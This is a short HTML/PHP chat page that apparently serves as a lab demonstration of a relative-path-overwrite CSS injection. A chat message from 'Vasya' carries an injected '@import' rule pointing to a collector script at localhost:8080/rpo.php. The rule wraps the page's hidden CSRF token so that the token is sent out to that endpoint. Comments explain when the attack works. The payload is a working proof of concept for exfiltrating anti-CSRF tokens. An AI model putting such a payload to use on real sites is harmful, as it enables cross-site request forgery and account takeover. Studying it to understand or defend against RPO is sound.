<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Attack works with old doctypes, or without doctype, or if page is in iframe (IE only) -->

<html>
<head>
    <meta charset="utf-8">
    <title>Authorisation</title>
    <link rel="shortcut icon" href="pics/login-icon.ico">
    <link rel="stylesheet" href="css/index.css" type="text/css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="js/jquery-2.1.4.min.js"></script>
</head>


<body class="body">


  <div class='greeting-line'>
		<div class="greeting-text">Welcome to chat,
			<div class='name' id='name-field'> <?php echo $_SESSION['email']; ?>!
			</div>
		</div>
			<button class="logout-btn btn btn-success"
			 onclick="window.location ='logout.php';">Logout</button>
	</div>

	<div class='message'>Change password?</div>


	<div class='message'><b> Vasya
	</b> said:
	{}@import 'http://localhost:8080/rpo.php?a=</div><input type="hidden" name="csrf" value="<?php echo md5($session_id)?>">';
	<!-- Here we have our injection around crsf value -->


<form action="post.php" method="post" class="send-form">
  <div class="enter-txt">Enter text:</div>
  <textarea class="msg-input" type="text" name="text" maxlength="255"></textarea>
  <p><input class="submit-btn" type="submit"></p>
</form>
</body>
</html>
